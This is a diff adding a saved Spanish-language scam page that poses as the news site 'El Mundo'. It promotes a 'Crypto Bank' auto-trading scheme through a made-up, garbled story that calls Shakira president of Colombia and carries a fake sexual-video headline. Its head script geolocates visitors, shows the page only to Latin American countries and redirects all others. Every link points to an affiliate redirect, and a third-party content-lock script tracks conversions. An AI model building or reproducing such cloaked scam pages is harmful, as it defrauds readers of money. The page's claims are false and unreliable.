@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <style type="text/css">body {
+      display: none !important
+      }
+      body[allowed=""] {
+        display: block !important
+      }
+    </style>
+    <script type="a6abc05c065ad35e32766b81-text/javascript">
+      var allowedCountries = ['br', 'mx', 'co', 'ar', 'pe', 've', 'cl', 'ec', 'gt', 'cu', 'ht', 'bo', 'do', 'hn', 'py', 'ni', 'sv', 'cr', 'pa', 'pr', 'uy', 'gp', 'mq', 'gf', 'mf', 'bl'],
+          redirectLink = 'https://www.bank-money-system.com/?aid=RNzM5lUuCi&ai=2190390&ci=728&gi=970&rd=301&MPC_1=1027dba29bb7beee294816d9d83fb0&MPC_2=35973&MPC_3=latam_ph&MPC_4=8404a91b-f36b-4378-a259-5091e3561f88',
+          keepRunning = true;
+      function checkPermission() {
+        var xmlhttp = new XMLHttpRequest();
+        xmlhttp.onreadystatechange = function() {
+          if (this.readyState == 4 && this.status == 200) {
+            var response = JSON.parse(this.responseText),
+                cc = response.country_code2.toLowerCase();
+            allowedCountries.forEach(function(item, i) {
+              if (keepRunning) {
+                if (item.toLowerCase() == cc) {
+                  document.getElementsByTagName('body')[0].setAttribute('allowed', '');
+                  keepRunning = false;
+                } else if (i == allowedCountries.length - 1) window.location.href = redirectLink;
+              }
+            })
+          }
+        };
+        xmlhttp.open('GET', 'https://api.ipgeolocation.io/ipgeo?apiKey=7eb191f31ddd4350a439c70bf2971c3f', true);
+        xmlhttp.send()
+      };
+      checkPermission();
+    </script><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="description" content="BREAKING"><title>El Mundo</title><meta name="robots" content="noindex,follow"><!-- Stylesheet --><link href="./El Mundoco_files/bootstrap.css" rel="stylesheet" />
+    <link rel="stylesheet" type="text/css" href="./El Mundoco_files/font-awesome.css" />
+    <link rel="stylesheet" href="./El Mundoco_files/style.css" type="text/css" />
+    <meta name="referrer" content="none">
+    <style type="text/css">.backpack.dropzone {
+      font-family: 'SF UI Display', 'Segoe UI';
+      font-size: 15px;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      width: 250px;
+      height: 150px;
+      font-weight: lighter;
+      color: white;
+      will-change: right;
+      z-index: 2147483647;
+      bottom: 20%;
+      background: #333;
+      position: fixed;
+      user-select: none;
+      transition: left .5s, right .5s;
+      right: 0px;
+      }
+      .backpack.dropzone .animation {
+        height: 80px;
+        width: 250px;
+        background: url("chrome-extension://lifbcibllhkdhoafpjfnlhfpfgnpldfl/assets/backpack/dropzone/hoverstate.png") left center;
+      }
+      .backpack.dropzone .title::before {
+        content: 'Save to';
+      }
+      .backpack.dropzone.closed {
+        right: -250px;
+      }
+      .backpack.dropzone.hover .animation {
+        animation: sxt-play-anim-hover 0.91s steps(21);
+        animation-fill-mode: forwards;
+        background: url("chrome-extension://lifbcibllhkdhoafpjfnlhfpfgnpldfl/assets/backpack/dropzone/hoverstate.png") left center;
+      }
+      @keyframes sxt-play-anim-hover {
+        from {
+          background-position: 0px;
+        }
+        to {
+          background-position: -5250px;
+        }
+      }
+      .backpack.dropzone.saving .title::before {
+        content: 'Saving to';
+      }
+      .backpack.dropzone.saving .animation {
+        background: url("chrome-extension://lifbcibllhkdhoafpjfnlhfpfgnpldfl/assets/backpack/dropzone/saving_loop.png") left center;
+        animation: sxt-play-anim-saving steps(59) 2.46s infinite;
+      }
+      @keyframes sxt-play-anim-saving {
+        100% {
+          background-position: -14750px;
+        }
+      }
+      .backpack.dropzone.saved .title::before {
+        content: 'Saved to';
+      }
+      .backpack.dropzone.saved .animation {
+        background: url("chrome-extension://lifbcibllhkdhoafpjfnlhfpfgnpldfl/assets/backpack/dropzone/saved.png") left center;
+        animation: sxt-play-anim-saved steps(20) 0.83s forwards;
+      }
+      @keyframes sxt-play-anim-saved {
+        100% {
+          background-position: -5000px;
+        }
+      }
+    </style>
+    <style type="text/css">.shopify-scraper-extension-block {
+      position: fixed;
+      right: 0;
+      top: 0;
+      width: 400px;
+      height: 100vh;
+      z-index: 2147483647;
+      box-shadow: -4px 1px 20px rgba(0, 0, 0, 0.25), -2px 0px 10px rgba(0, 0, 0, 0.22);
+      }
+      .shopify-scraper-extension-block .shopify-scraper-extension-iframe {
+        width: 100%;
+        height: 100%;
+      }
+      @media(min-width: 800px) {
+        .ep-nav .container {
+          padding-top: 0
+        }
+        .ep-nav .ep-top-logo {
+          width: 33%;
+        }
+        .ep-nav .ep-top-logo a,
+        .ep-nav .ep-top-logo a img {
+          width: 100%;
+          display: block;
+        }
+        .ep-nav #ep-logo {
+          margin-top: 0
+        }
+      }
+      @media(max-width: 800px) {
+        .ep-nav .ep-top-logo a,
+        .ep-nav .ep-top-logo a img {
+          width: 100%;
+          display: block;
+        }
+        .ep-nav .ep-top-logo {
+          width: 100%
+        }
+        .ep-nav #ep-logo {
+          margin-top: 0
+        }
+        .ep-nav .container {
+          padding-top: 0
+        }
+        .ep-nav {
+          padding-bottom: 0
+        }
+        .content-box {
+          padding: 0 10px
+        }
+      }
+    </style>
+  </head>
+  <body style="padding: 0px;" cz-shortcut-listen="true" data-gr-c-s-loaded="true">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js" type="a6abc05c065ad35e32766b81-text/javascript">
+    </script>
+    <script src="https://api.viptradingapp.com/plugins/jquery.xmc-content-lock.js" type="a6abc05c065ad35e32766b81-text/javascript">
+    </script>
+    <script type="a6abc05c065ad35e32766b81-text/javascript">
+      $(document).ready(function() {
+        $.fn.contentLock({
+          lang: 'es',
+          spreadsheet: "1RtOqmgiLx7FbRQG-JXg84eIDwzuf_XvpTKPljHxjayY",
+          user: "ejL1yct7gFcPpdLc6jMbarmxJrO2",
+          postback: "http://www.pbterra.com/name/Xmedia/at?subid_short={utm_content}",
+          custom_ua: ""
+        });
+      });
+    </script>
+    <script type="a6abc05c065ad35e32766b81-text/javascript">
+      $(document).ready(function() {
+        setTimeout(function() {
+          $(this).scrollTop(0);
+        }, 100);
+      });
+    </script><nav class="ep-nav" role="navigation"><!-- Menu --><div class="container">
+    <div class="ep-top-logo">
+      <div id="ep-logo"><a href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390"><img alt="" src="./El Mundoco_files/logo-ep.jpg" /></a>
+      </div>
+    </div>
+    <div class="ep-top-menu menu-1 text-center" style="margin-top: 5px;">
+      <ul><li id="menu-item-124430" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-124430"><a category="" nacion="" href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">Naci&oacute;n</a></li><li id="menu-item-124519" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-124519"><a category="" elpeladero="" href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">ElPeladero</a></li><li id="menu-item-124520" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-124520"><a category="" inversion="" href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">Inversi&oacute;n</a></li><li id="menu-item-124521" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-124521"><a category="" opinion="" href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">Opini&oacute;n</a></li><li id="menu-item-124522" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-124522"><a category="" investigacion="" href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">Investigaci&oacute;n</a></li><li class="has-dropdown"><a 24="" 2020="" investigacion="" 02="" los-conflictos-de-interes-que-acechan-al-nuevo-director-de-caminos="" href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">M&aacute;s</a>
+        <ul class="dropdown" style="display: none;"><li id="menu-item-294865" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-294865"><a category="" podcast="" href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">Podcast</a></li><li id="menu-item-294336" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-294336"><a href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">Life</a></li><li id="menu-item-203912" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-203912"><a especiales="" href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">Especiales</a></li><li id="menu-item-124523" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-124523"><a category="" mundo="" href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">Mundo</a></li><li id="menu-item-124524" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-124524"><a category="" gente="" href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">Gente&amp;+</a></li><li id="menu-item-124525" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-124525"><a category="" cartas="" href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">Cartas</a></li><li id="menu-item-124526" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-124526"><a category="" oculta="" href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">Oculta</a></li><li id="menu-item-124527" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-124527"><a category="" accion="" href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">Acci&oacute;n</a></li><li id="menu-item-124528" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-124528"><a category="" lacolumna="" href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">La Columna</a></li><li id="menu-item-124529" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-124529"><a category="" domingo="" href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">Domingo</a></li><li id="menu-item-260790" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-260790"><a category="" butaca="" href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">Butaca</a></li><li id="menu-item-271614" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-271614"><a category="" comer-y-beber="" href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">Comer y Beber</a></li><li id="menu-item-124530" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-124530"><a category="" insolito="" href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">Ins&oacute;lito</a></li><li id="menu-item-124531" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-124531"><a category="" funerarias="" href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">Funerarias</a></li><li id="menu-item-124532" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-124532"><a category="" elacordeon="" href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">El Acorde&oacute;n</a></li><li id="menu-item-124533" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-124533"><a category="" tecnologia="" href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">Tecnolog&iacute;a</a></li><li id="menu-item-124534" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-124534"><a category="" salud="" href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">Salud</a></li><li id="menu-item-124535" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-124535"><a category="" ciencia="" href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">Ciencia</a></li><li id="menu-item-142438" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-142438"><a patrocinios="" href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">Patrocinios</a></li><li id="menu-item-173386" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-173386"><a multimedia="" href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">Multimedia</a></li><li id="menu-item-177919" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-177919"><a category="" show="" href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">Show</a></li><li id="menu-item-203910" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-203910"><a href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">Suscribete</a></li><li id="menu-item-273498" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-273498"><a category="" destino="" href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">Destino</a></li>
+        </ul></li>
+      </ul>
+    </div>
+    <div class="ep-top-social text-right" style="z-index: 1;">
+      <div class="share" style="display: none;">
+        <div class="container">
+          <h6 id="top-share-title"><span style="padding-right:5px" id="top-cat-title" class="investigacion">Investigaci&oacute;n</span> <span id="top-shtitle">Los conflictos de inter&eacute;s que acechan al nuevo director de Caminos</span>
+          </h6>
+          <div class="a2a_kit a2a_kit_size_32 10 a2a_default_style" style="float: right; line-height: 32px;"><a class="a2a_button_facebook" target="_blank" rel="nofollow noopener"><span class="a2a_svg a2a_s__default a2a_s_facebook" style="background-color: rgb(59, 89, 152);"> 
+            <svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 32 32"> 
+              <path fill="#FFF" d="M17.78 27.5V17.008h3.522l.527-4.09h-4.05v-2.61c0-1.182.33-1.99 2.023-1.99h2.166V4.66c-.375-.05-1.66-.16-3.155-.16-3.123 0-5.26 1.905-5.26 5.405v3.016h-3.53v4.09h3.53V27.5h4.223z"> 
+              </path> 
+            </svg></span><span class="a2a_label">Facebook</span></a> <a class="a2a_button_twitter" target="_blank" rel="nofollow noopener"><span class="a2a_svg a2a_s__default a2a_s_twitter" style="background-color: rgb(85, 172, 238);"> 
+            <svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 32 32"> 
+              <path fill="#FFF" d="M28 8.557a9.913 9.913 0 0 1-2.828.775 4.93 4.93 0 0 0 2.166-2.725 9.738 9.738 0 0 1-3.13 1.194 4.92 4.92 0 0 0-3.593-1.55 4.924 4.924 0 0 0-4.794 6.049c-4.09-.21-7.72-2.17-10.15-5.15a4.942 4.942 0 0 0-.665 2.477c0 1.71.87 3.214 2.19 4.1a4.968 4.968 0 0 1-2.23-.616v.06c0 2.39 1.7 4.38 3.952 4.83-.414.115-.85.174-1.297.174-.318 0-.626-.03-.928-.086a4.935 4.935 0 0 0 4.6 3.42 9.893 9.893 0 0 1-6.114 2.107c-.398 0-.79-.023-1.175-.068a13.953 13.953 0 0 0 7.55 2.213c9.056 0 14.01-7.507 14.01-14.013 0-.213-.005-.426-.015-.637.96-.695 1.795-1.56 2.455-2.55z"> 
+              </path> 
+            </svg></span><span class="a2a_label">Twitter</span></a> <a class="a2a_button_whatsapp" target="_blank" rel="nofollow noopener"><span class="a2a_svg a2a_s__default a2a_s_whatsapp" style="background-color: rgb(18, 175, 10);"> 
+            <svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 32 32"> 
+              <path fill-rule="evenodd" clip-rule="evenodd" fill="#FFF" d="M16.21 4.41C9.973 4.41 4.917 9.465 4.917 15.7c0 2.134.592 4.13 1.62 5.832L4.5 27.59l6.25-2.002a11.241 11.241 0 0 0 5.46 1.404c6.234 0 11.29-5.055 11.29-11.29 0-6.237-5.056-11.292-11.29-11.292zm0 20.69c-1.91 0-3.69-.57-5.173-1.553l-3.61 1.156 1.173-3.49a9.345 9.345 0 0 1-1.79-5.512c0-5.18 4.217-9.4 9.4-9.4 5.183 0 9.397 4.22 9.397 9.4 0 5.188-4.214 9.4-9.398 9.4zm5.293-6.832c-.284-.155-1.673-.906-1.934-1.012-.265-.106-.455-.16-.658.12s-.78.91-.954 1.096c-.176.186-.345.203-.628.048-.282-.154-1.2-.494-2.264-1.517-.83-.795-1.373-1.76-1.53-2.055-.158-.295 0-.445.15-.584.134-.124.3-.326.45-.488.15-.163.203-.28.306-.47.104-.19.06-.36-.005-.506-.066-.147-.59-1.587-.81-2.173-.218-.586-.46-.498-.63-.505-.168-.007-.358-.038-.55-.045-.19-.007-.51.054-.78.332-.277.274-1.05.943-1.1 2.362-.055 1.418.926 2.826 1.064 3.023.137.2 1.874 3.272 4.76 4.537 2.888 1.264 2.9.878 3.43.85.53-.027 1.734-.633 2-1.297.266-.664.287-1.24.22-1.363-.07-.123-.26-.203-.54-.357z"> 
+              </path> 
+            </svg></span><span class="a2a_label">WhatsApp</span></a> <a class="a2a_button_telegram" target="_blank" rel="nofollow noopener"><span class="a2a_svg a2a_s__default a2a_s_telegram" style="background-color: rgb(44, 165, 224);"> 
+            <svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 32 32"> 
+              <path fill="#FFF" d="M25.515 6.896L6.027 14.41c-1.33.534-1.322 1.276-.243 1.606l5 1.56 1.72 5.66c.226.625.115.873.77.873.506 0 .73-.235 1.012-.51l2.43-2.363 5.056 3.734c.93.514 1.602.25 1.834-.863l3.32-15.638c.338-1.363-.52-1.98-1.41-1.577z"> 
+              </path> 
+            </svg></span><span class="a2a_label">Telegram</span></a>
+            <div style="clear: both;">&nbsp;
+            </div>
+            <div style="clear: both;">&nbsp;
+            </div>
+          </div>
+          <ul class="ep-article-social">
+            <script async="" src="./El Mundoco_files/page.js.download" type="a6abc05c065ad35e32766b81-text/javascript">
+            </script></ul></div><!-- container --></div><!-- share de notas --></div>
+    </div>
+    </nav>
+    <section class="content-box">
+      <div class="container content">
+        <div class="row">
+          <div class="col-md-8">
+            <h1>Shakira atrapada en una org&iacute;a salvaje. Ella dice: &quot;No tengo problemas para publicar el video. Me siento c&oacute;moda con mi cuerpo, vea el video!
+            </h1>
+            <p><a href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390"><em>Haga clic aqu&iacute; para ver el video antes de recibir instrucciones para eliminarlo</em></a>
+            </p>
+            <script language="Javascript" type="a6abc05c065ad35e32766b81-text/javascript">
+              var dayNames = new Array("Domingo", "Lunes", "Martes", "Miércoles", "Jueves", "Viernes", "Sábado");
+              var monthNames = new Array("Enero", "Febrero", "Marzo", "Abril ", "Mayo", "Junio", "Julio", "Agosto", "Septiembre", "Octubre", "Noviembre", "Diciembre");
+              var now = new Date();
+              document.write(dayNames[now.getDay()] + ", " + monthNames[now.getMonth()] + " " + now.getDate() + ", " + now.getFullYear());
+            </script><a href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390"><img id="hero" class="img-responsive" style="padding: 0px;" alt="" src="./El Mundoco_files/50f03564a688e780.jpg" /></a><center><i>Shakira ha revelado una nueva inversi&oacute;n hasta ahora secreta que est&aacute; haciendo ricos a cientos de Colombianos.</i></center>
+            <p class="m-t-25"><strong>Shakira</strong> Es el actual presidente de Colombia. Ejerci&oacute; como senador de la Rep&uacute;blica de Colombia desde el 20 de julio de 2014 hasta el 10 de abril de 2018 y e famoso por no guardarse ning&uacute;n secreto y por hablar simple y llanamente de como gana su dinero.De hecho, utiliz&oacute; una plataforma para enriquecerse y ahora todo se descubre, esa plataforma est&aacute; disponible para todos desde Colombia. Esa plataforma se llama <a href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">Crypto Bank</a>
+            </p>
+            <p class="m-t-25">La semana pasada fue entrevistado y anunci&oacute; una nueva &quot;laguna dorada&quot;, que seg&uacute;n &eacute;l, puede <strong>convertir en millonario a cualquiera en 3 o 4 meses</strong>.Mario anim&oacute; a que todos los Colombianos se lanzaran a aprovechar esta asombrosa oportunidad antes de que los grandes bancos lo silenciaran definitivamente.
+            </p>
+            <p class="m-t-25">Y, efectivamente, minutos despu&eacute;s de que terminara la entrevista, Banco Central de Colombia llam&oacute; para evitar que la entrevista de Odily Pineda fuera emitida, pero ya era demasiado tarde.
+            </p>
+            <p class="m-t-25"><strong><a href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">Esto es exactamente lo que pas&oacute;:</a> </strong>
+            </p>
+            <p class="m-t-25">La presentador, Odily Pineda, invit&oacute; a Mario al programa para que compartiera sus consejos para aumentar nuestras ganancias y lo empresario revel&oacute; un gran secreto.
+            </p>
+            <p class="m-t-25"><em>&quot;Mi receta para el &eacute;xito siempre ha sido aprovechar las nuevas oportunidades r&aacute;pidamente y sin vacilar.Y ahora mismo, mi mayor generador de ganancias es un <strong><a href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">programa de operaci&oacute;n autom&aacute;tica de criptomoneda llamado </a><a href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390">Crypto Bank</a></strong>. Es la ocasi&oacute;n m&aacute;s grande que he visto en mi vida de conseguir r&aacute;pidamente una peque&ntilde;a fortuna. Les animo a todos a a provecharse antes de que los bancos le pongan freno.&quot;</em>
+            </p>
+            <p class="m-t-25">Su entrevista termin&oacute; antes de que pudiera dar m&aacute;s detalles, as&iacute; que concertamos una entrevista en exclusiva con el propio empresario peruano para aprender m&aacute;s sobre esta oportunidad tan controvertida.
+            </p>
+            <p class="m-t-25"><a href="https://cd-down.com/smartlink/?a=76628&amp;sm=3390"><img id="img2" class="img-responsive" style="padding: 0px;" alt="" src="./El Mundoco_files/2bc25290cadc8a52.jpg" /></a>
+            </p>
+            <p>&nbsp;
+            </p>
+          </div>
+        </div>
+      </div>
+    </section>
+    <div class="shopify-scraper-extension-block" style="display: none;">
+      <iframe frameborder="0" class="shopify-scraper-extension-iframe" src="./El Mundoco_files/saved_resource.html">
+      </iframe>
+    </div>
+  <script src="https://ajax.cloudflare.com/cdn-cgi/scripts/7089c43e/cloudflare-static/rocket-loader.min.js" data-cf-settings="a6abc05c065ad35e32766b81-|49" defer=""></script></body>
+</html>
